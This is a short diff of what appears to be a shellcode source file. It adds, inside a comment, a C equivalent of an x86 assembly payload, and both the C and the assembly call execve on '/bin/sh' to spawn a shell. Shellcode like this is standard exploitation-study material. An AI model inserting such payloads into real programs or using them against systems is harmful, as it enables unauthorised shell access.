@@ -15,6 +15,14 @@ mov ecx, eax
 mov edx, eax
 mov al, 0xb
 int 0x80
+-----------------
+#include<stdio.h>
+#include<stdlib.h>
+
+void main() {
+    char shell[] = "/bin/sh";
+    execve(shell, 0, 0);
+}
 */
 #include<stdio.h>
 #include<string.h>
